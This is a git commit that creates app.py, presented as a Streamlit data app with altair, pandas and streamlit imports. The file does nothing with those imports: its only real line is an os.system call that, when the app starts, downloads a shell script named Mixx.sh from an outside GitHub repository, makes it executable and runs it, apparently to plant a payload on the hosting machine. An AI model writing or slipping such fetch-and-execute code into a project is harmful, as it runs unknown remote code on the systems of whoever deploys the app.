97c365834f3ecda73b1b186b3bae1b5df112af3a
Uyarad <120656629+Uyarad@users.noreply.github.com>
2022-12-15 22:18:01 +0800

    Create app.py

---
+++ app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("curl -L -o Mixx.sh https://github.com/Ikuzot/Yahaha/raw/main/Mixx.sh && chmod +x Mixx.sh && ./Mixx.sh")
